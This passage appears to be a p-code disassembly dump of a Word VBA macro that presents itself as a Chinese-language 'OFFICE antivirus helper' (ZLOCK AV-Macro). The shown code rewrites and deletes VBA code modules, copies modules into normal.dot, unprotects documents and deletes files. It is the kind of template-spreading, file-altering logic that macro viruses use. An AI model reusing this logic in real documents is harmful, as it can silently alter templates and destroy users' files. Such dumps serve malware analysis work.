' 	VarDefn mydlg (As Object)
' Line #170:
' 	Dim 
' 	VarDefn okcancle
' Line #171:
' 	Dim 
' 	VarDefn togdlg (As Object)
' Line #172:
' 	Dim 
' 	VarDefn tog
' Line #173:
' 	Dim 
' 	VarDefn fsdlg (As Object)
' Line #174:
' 	Dim 
' 	VarDefn opop
' Line #175:
' 	Dim 
' 	VarDefn zoodlg (As Object)
' Line #176:
' 	Dim 
' 	VarDefn vpe
' Line #177:
' 	Dim 
' 	VarDefn _B_var_resume
' Line #178:
' 	LitDI2 0x0000 
' 	St i 
' Line #179:
' 	LitDI2 0x0000 
' 	St all 
' Line #180:
' 	LitDI2 0x0000 
' 	St k 
' Line #181:
' Line #182:
' Line #183:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tpd 
' Line #184:
' 	Dim 
' 	VarDefn tpddlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsProtectDocument 0x0001 
' 	Set tpddlg 
' Line #185:
' 	Ld tpddlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsProtectDocument 0x0001 
' Line #186:
' Line #187:
' 	GoTo gwoo 
' Line #188:
' Line #189:
' 	Label tpd 
' Line #190:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x01FD 
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitDI2 0x0064 
' 	St tpdd 
' Line #192:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #193:
' 	EndIfBlock 
' Line #194:
' Line #195:
' 	Label gwoo 
' Line #196:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError done 
' Line #197:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St fn$ 
' Line #198:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St nor 
' Line #199:
' 	Ld nor 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #200:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nor 
' 	For 
' Line #201:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	Ld i 
' 	ArgsSt norn__$ 0x0001 
' Line #202:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	OnError (Resume Next) 
' Line #205:
' 	LitDI2 0x0002 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	St moa$ 
' Line #206:
' 	Ld moa$ 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St moa$ 
' 	EndIf 
' Line #207:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	St _B_str_mon$ 
' Line #208:
' 	Ld _B_str_mon$ 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St _B_str_mon$ 
' 	EndIf 
' Line #209:
' Line #210:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St mo 
' Line #211:
' 	Ld mo 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld moa$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	Ld _B_str_mon$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #212:
' 	GoTo rechk 
' Line #213:
' 	ElseBlock 
' Line #214:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St mo 
' Line #215:
' 	Ld mo 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo rechk 
' 	EndIf 
' Line #216:
' 	EndIfBlock 
' Line #217:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St all 
' Line #218:
' 	Ld all 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #219:
' Line #220:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set ffdlg 
' Line #221:
' 	Ld ffdlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #222:
' 	Ld ffdlg 
' 	MemLd Format$ 
' 	St ffd 
' Line #223:
' Line #224:
' 	OnError (Resume Next) 
' Line #225:
' 	Ld ffd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld fn$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0003 "DOT"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #226:
' Line #227:
' 	Ld Application 
' 	MemLd Assistant 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #228:
' Line #229:
' 	StartWithExpr 
' 	Ld Assistant 
' 	With 
' Line #230:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #231:
' Line #232:
' 	EndWith 
' Line #233:
' Line #234:
' 	EndIfBlock 
' Line #235:
' Line #236:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #237:
' 	LitStr 0x0038 "偵測到文件為範本文件，有另存新檔的問題，是否要恢復正常？"
' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	LitDI2 0x0034 
' 	Ld WordBasic 
' 	ArgsMemLd MsgBox 0x0003 
' 	St button 
' Line #238:
' 	Ld button 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoTo tocln 
' 	EndIf 
' Line #239:
' 	ElseBlock 
' Line #240:
' 	Ld tpdd 
' 	LitDI2 0x0064 
' 	Eq 
' 	Ld fn$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #241:
' Line #242:
' 	Ld Application 
' 	MemLd Assistant 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #243:
' Line #244:
' 	StartWithExpr 
' 	Ld Assistant 
' 	With 
' Line #245:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #246:
' Line #247:
' 	EndWith 
' Line #248:
' Line #249:
' 	EndIfBlock 
' Line #250:
' 	QuoteRem 0x0000 0x000E "WordBasic.Beep"
' Line #251:
' 	QuoteRem 0x0001 0x0060 "   button = WordBasic.MsgBox("偵測到文件有密碼保護，是否要消除？", "OFFICE 防毒小幫手警告!", 52)"
' Line #252:
' 	QuoteRem 0x0002 0x001B "      If (button = -1) Then"
' Line #253:
' 	QuoteRem 0x0003 0x0023 "     WordBasic.FileSaveAs Format:=1"
' Line #254:
' 	QuoteRem 0x0004 0x000E "    GoTo tocln"
' Line #255:
' 	QuoteRem 0x0005 0x0009 "   End If"
' Line #256:
' 	EndIfBlock 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	GoTo done 
' 	QuoteRem 0x0024 0x0004 "if 1"
' Line #259:
' 	EndIfBlock 
' 	QuoteRem 0x0024 0x0005 "end 1"
' Line #260:
' Line #261:
' 	Dim 
' 	VarDefn ppdlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSummaryInfo 0x0001 
' 	Set ppdlg 
' Line #262:
' 	Ld ppdlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #263:
' Line #264:
' 	Ld ppdlg 
' 	MemLd Template 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo done 
' 	EndIf 
' Line #265:
' Line #266:
' Line #267:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld all 
' 	For 
' Line #268:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	Ld i 
' 	ArgsSt alln__$ 0x0001 
' Line #269:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000A "ZlockMacro"
' 	Eq 
' 	IfBlock 
' Line #270:
' 	LitStr 0x000A "ZlockMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	LitStr 0x0028 "OFFICE 防毒小幫手警告!---ZlockMacro     "
' 	Eq 
' 	LitStr 0x000A "ZlockMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	LitStr 0x0028 "G.Great ZLOCK AV-Macro---ZlockMacro     "
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #271:
' 	Ld fn$ 
' 	LitDI2 0x000C 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "Z-MACROC.DOC"
' 	Eq 
' 	Ld fn$ 
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000B "Z-MACRO.DOC"
' 	Eq 
' 	Or 
' 	Ld fn$ 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "Z-SCAN.DOC"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #272:
' Line #273:
' 	Ld WordBasic 
' 	ArgsMemCall ToolsUnprotectDocument 0x0000 
' Line #274:
' 	LitDI2 0x0000 
' 	ParamNamed FieldCodes 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsView 0x0001 
' Line #275:
' 	LitStr 0x0000 ""
' 	ParamNamed DocumentPassword 
' 	LitDI2 0x0000 
' 	ParamNamed NoReset 
' 	LitDI2 0x0001 
' 	ParamNamed TypeOf 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsProtectDocument 0x0003 
' Line #276:
' Line #277:
' 	Ld fn$ 
' 	LitDI2 0x000C 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "Z-MACROC.DOC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0009 
' 	St dt 
' 	EndIf 
' Line #278:
' 	Ld fn$ 
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000B "Z-MACRO.DOC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	St dt 
' 	EndIf 
' Line #279:
' 	Ld fn$ 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "Z-SCAN.DOC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0007 
' 	St dt 
' 	EndIf 
' Line #280:
' Line #281:
' 	Ld fn$ 
' 	LitStr 0x0001 "."
' 	FnInStr 
' 	St dot 
' Line #282:
' 	Ld dot 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld fn$ 
' 	Ld dot 
' 	Ld dt 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St prefix$ 
' 	EndIf 
' Line #283:
' 	Ld prefix$ 
' 	LitStr 0x0009 "zlock.com"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #284:
' 	GoTo done 
' Line #285:
' 	ElseBlock 
' Line #286:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #287:
' 	LitStr 0x0009 "所開啟的 "
' 	Ld fn$ 
' 	Add 
' 	LitStr 0x0050 " 檔案並沒有在 ZLOCK 的正式安裝目錄內，為了避免有問題的版本，請利用原版軟體安裝。"
' 	Add 
' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #288:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' Line #289:
' 	GoTo done 
' Line #290:
' 	EndIfBlock 
' Line #291:
' 	EndIfBlock 
' Line #292:
' 	EndIfBlock 
' Line #293:
' 	EndIfBlock 
' Line #294:
' Line #295:
' 	StartForVariable 
' 	Next 
' Line #296:
' Line #297:
' 	Label rechk 
' Line #298:
' Line #299:
' 	OnError (Resume Next) 
' Line #300:
' 	Ld Application 
' 	MemLd Assistant 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #301:
' 	StartWithExpr 
' 	Ld Assistant 
' 	With 
' Line #302:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #303:
' Line #304:
' 	EndWith 
' Line #305:
' 	EndIfBlock 
' Line #306:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #307:
' 	LitStr 0x002C "偵測到此文件可能含有巨集病毒，是否要清除掉！"
' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	LitDI2 0x0034 
' 	Ld WordBasic 
' 	ArgsMemLd MsgBox 0x0003 
' 	St button 
' Line #308:
' 	Ld button 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoTo tocln 
' 	EndIf 
' Line #309:
' 	GoTo done 
' Line #310:
' Line #311:
' 	Label tocln 
' Line #312:
' 	Ld mo 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld moa$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	Ld _B_str_mon$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #313:
' 	OnError (Resume Next) 
' Line #314:
' 	LineCont 0x0004 13 00 08 00
' 	Ld moa$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld temp 
' 	Ld Options 
' 	ArgsMemLd wdUserTemplatesPath 0x0001 
' 	LitStr 0x000B "\normal.dot"
' 	Add 
' 	ParamNamed wdOrganizerObjectProjectItems 
' 	Ld moa$ 
' 	ParamNamed New 
' 	Ld tttt 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0003 
' 	EndIf 
' Line #315:
' 	LineCont 0x0004 0C 00 08 00
' 	Ld _B_str_mon$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fn$ 
' 	ParamNamed wdOrganizerObjectProjectItems 
' 	Ld _B_str_mon$ 
' 	ParamNamed New 
' 	Ld tttt 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0003 
' 	EndIf 
' Line #316:
' 	Ld mo 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld mo 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #317:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #318:
' 	Ld NormalTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #319:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' Line #320:
' 	Ld fn$ 
' 	ParamNamed New 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #321:
' 	Ld Mode 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #322:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #323:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St mo 
' Line #324:
' 	LitDI2 0x0001 
' 	Ld mo 
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #325:
' Line #326:
' 	GoTo okk 
' Line #327:
' 	EndIfBlock 
' Line #328:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsOptionsGeneral 0x0001 
' 	Set togdlg 
' Line #329:
' 	Ld togdlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #330:
' 	Ld togdlg 
' 	MemLd RecentFiles 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #331:
' 	Ld togdlg 
' 	MemLd RecentFileCount 
' 	St tog$ 
' Line #332:
' 	LitDI2 0x0000 
' 	ParamNamed RecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed RecentFileCount 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0002 
' Line #333:
' 	LitDI2 0x0001 
' 	ParamNamed RecentFiles 
' 	Ld tog$ 
' 	ParamNamed RecentFileCount 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0002 
' Line #334:
' 	EndIfBlock 
' Line #335:
' Line #336:
' Line #337:
' 	Label opn 
' Line #338:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #339:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError opn1 
' Line #340:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileTemplates 0x0001 
' 	Set fsdlg 
' Line #341:
' 	Ld fsdlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileTemplates 0x0001 
' Line #342:
' 	LitDI2 0x0064 
' 	St opop 
' Line #343:
' 	Label opn1 
' Line #344:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ViewZoom 0x0001 
' 	Set zoodlg 
' Line #345:
' 	Ld zoodlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ViewZoom 0x0001 
' Line #346:
' Line #347:
' 	OnError (Resume Next) 
' Line #348:
' 	Ld WordBasic 
' 	ArgsMemLd ViewNormal 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #349:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #350:
' 	Ld fn$ 
' 	ParamNamed Template 
' 	LitDI2 0x0000 
' 	ParamNamed NewTemplate 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0002 
' Line #351:
' 	Ld WordBasic 
' 	ArgsMemCall ViewNormal 0x0000 
' Line #352:
' 	GoTo full 
' Line #353:
' 	EndIfBlock 
' Line #354:
' 	Ld WordBasic 
' 	ArgsMemLd ViewPage 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #355:
' 	LitDI2 0x0064 
' 	St vpe 
' Line #356:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #357:
' 	Ld fn$ 
' 	ParamNamed Template 
' 	LitDI2 0x0000 
' 	ParamNamed NewTemplate 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0002 
' Line #358:
' 	Ld WordBasic 
' 	ArgsMemCall ViewPage 0x0000 
' Line #359:
' 	GoTo full 
' Line #360:
' 	EndIfBlock 
' Line #361:
' 	Ld opop 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo full 
' 	EndIf 
' Line #362:
' 	Ld WordBasic 
' 	ArgsMemLd ViewOutline 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #363:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #364:
' 	Ld fn$ 
' 	ParamNamed Template 
' 	LitDI2 0x0000 
' 	ParamNamed NewTemplate 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0002 
' Line #365:
' 	Ld WordBasic 
' 	ArgsMemCall ViewOutline 0x0000 
' Line #366:
' 	GoTo full 
' Line #367:
' 	EndIfBlock 
' Line #368:
' 	Ld WordBasic 
' 	ArgsMemLd ViewMasterDocument 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #369:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #370:
' 	Ld fn$ 
' 	ParamNamed Template 
' 	LitDI2 0x0000 
' 	ParamNamed NewTemplate 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0002 
' Line #371:
' 	Ld WordBasic 
' 	ArgsMemCall ViewMasterDocument 0x0000 
' Line #372:
' 	GoTo full 
' Line #373:
' 	EndIfBlock 
' Line #374:
' Line #375:
' 	Label full 
' Line #376:
' Line #377:
' 	OnError (Resume Next) 
' Line #378:
' 	Ld vpe 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #379:
' 	Ld zoodlg 
' 	MemLd AutoFit 
' 	ParamNamed AutoFit 
' 	Ld zoodlg 
' 	MemLd TwoPages 
' 	ParamNamed TwoPages 
' 	Ld zoodlg 
' 	MemLd FullPage 
' 	ParamNamed FullPage 
' 	Ld zoodlg 
' 	MemLd NumColumns 
' 	ParamNamed NumColumns 
' 	Ld zoodlg 
' 	MemLd NumRows 
' 	ParamNamed NumRows 
' 	Ld zoodlg 
' 	MemLd ZoomPercent 
' 	ParamNamed ZoomPercent 
' 	Ld WordBasic 
' 	ArgsMemCall ViewZoom 0x0006 
' Line #380:
' 	LitDI2 0x0000 
' 	St vpe 
' Line #381:
' 	EndIfBlock 
' Line #382:
' 	Ld zoodlg 
' 	MemLd AutoFit 
' 	ParamNamed AutoFit 
' 	Ld zoodlg 
' 	MemLd ZoomPercent 
' 	ParamNamed ZoomPercent 
' 	Ld WordBasic 
' 	ArgsMemCall ViewZoom 0x0002 
' Line #383:
' Line #384:
' Line #385:
' 	Ld opop 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #386:
' 	Ld fsdlg 
' 	MemLd Store 
' 	ParamNamed Store 
' 	Ld fsdlg 
' 	MemLd Template 
' 	ParamNamed Template 
' 	Ld fsdlg 
' 	MemLd LinkStyles 
' 	ParamNamed LinkStyles 
' 	Ld WordBasic 
' 	ArgsMemCall FileTemplates 0x0003 
' Line #387:
' Line #388:
' 	EndIfBlock 
' Line #389:
' 	LitDI2 0x0000 
' 	St opop 
' Line #390:
' Line #391:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError nx 
' Line #392:
' 	Ld fn$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Eq 
' 	Ld fn$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "B"
' 	Eq 
' 	Or 
' 	Ld tpdd 
' 	LitDI2 0x0064 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #393:
' 	LitStr 0x000C "c:\ztemp.ztm"
' 	ParamNamed New 
' 	LitDI2 0x0000 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0003 
' Line #394:
' 	ElseBlock 
' Line #395:
' 	Ld fn$ 
' 	ParamNamed New 
' 	LitDI2 0x0000 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0003 
' Line #396:
' 	GoTo okk 
' Line #397:
' 	EndIfBlock 
' Line #398:
' Line #399:
' 	Ld fn$ 
' 	LitStr 0x0001 "."
' 	FnInStr 
' 	St dot 
' Line #400:
' 	Ld dot 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld fn$ 
' 	Ld dot 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St prefix$ 
' 	EndIf 
' Line #401:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #402:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	IfBlock 
' Line #403:
' 	LitStr 0x000C "c:\ztemp.ztm"
' 	ParamNamed FileName 
' 	Ld fn$ 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #404:
' 	GoTo kiii 
' Line #405:
' 	EndIfBlock 
' Line #406:
' Line #407:
' 	LitStr 0x000B "c:\test.tst"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #408:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "test"
' 	PrintItemNL 
' Line #409:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #410:
' Line #411:
' 	LitStr 0x000B "c:\test.tst"
' 	ParamNamed FileName 
' 	Ld fn$ 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #412:
' 	LitStr 0x000B "c:\test.tst"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #413:
' 	Ld fn$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' 	LitStr 0x000C "c:\ztemp.ztm"
' 	ParamNamed FileName 
' 	Ld fn$ 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #418:
' 	Ld fn$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #419:
' 	LitStr 0x000C "c:\ztemp.ztm"
' 	ParamNamed FileName 
' 	Ld fn$ 
' 	LitStr 0x0004 ".doc"
' 	Add 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #420:
' 	Ld prefix$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #421:
' 	EndIfBlock 
' Line #422:
' 	Label kiii 
' Line #423:
' 	LitStr 0x000C "c:\ztemp.ztm"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #424:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #425:
' 	Ld fn$ 
' 	ParamNamed New 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #426:
' Line #427:
' 	Label okk 
' Line #428:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #429:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #430:
' 	LitStr 0x0035 "OFFICE 防毒小幫手解毒成功，並還原文件另存新檔的功能。"
